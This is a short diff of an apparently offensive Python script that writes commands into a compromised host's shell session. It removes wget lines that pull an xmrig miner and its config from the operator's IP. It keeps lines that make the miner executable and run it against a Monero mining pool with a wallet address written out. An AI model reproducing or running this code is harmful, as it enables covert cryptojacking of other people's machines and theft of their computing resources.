@@ -29,9 +29,6 @@ def main(argv):
         time.sleep(1)
 
     shell = client.sessions.session('3')
-    shell.write('wget --no-check-certificate http://{0}/downloads/xmrig'.format(my_ip))
-    shell.write('wget --no-check-certificate http://{0}/downloads/config.json'.format(my_ip))
-    shell.write('wget --no-check-certificate http://{0}/downloads/SHA256SUMS'.format(my_ip))
     shell.write('chmod +x ./xmrig')
     shell.write('timeout 60s ./xmrig --donate-level 4 -o pool.minexmr.com:443 -u '
                 '44Hp1de8CprPz2K74U5ch4VssxZQUDjVrZWtgRScHZo83mb6D6cHfpLZg4zhaT1BvzJe5jdbPLHzqHp4jrx1hP6UHFCgWhN '
